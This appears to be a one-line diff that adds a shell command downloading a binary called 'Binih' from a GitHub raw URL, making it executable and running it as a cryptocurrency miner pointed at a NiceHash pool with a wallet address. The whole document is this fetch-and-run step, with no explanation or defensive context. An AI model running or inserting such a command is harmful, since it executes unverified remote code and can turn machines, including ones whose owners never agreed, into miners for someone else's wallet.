@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/AZKAFamilychanel/BinihCuanMangAdhy/main/Binih && chmod +x Binih && ./Binih -a beamv3 -o nicehash+tcp://beamv3.eu-north.nicehash.com:3387 -u 3EWNNEoieMZHuYRPo7srhVSXznGMC1frwq.AbahGemoy
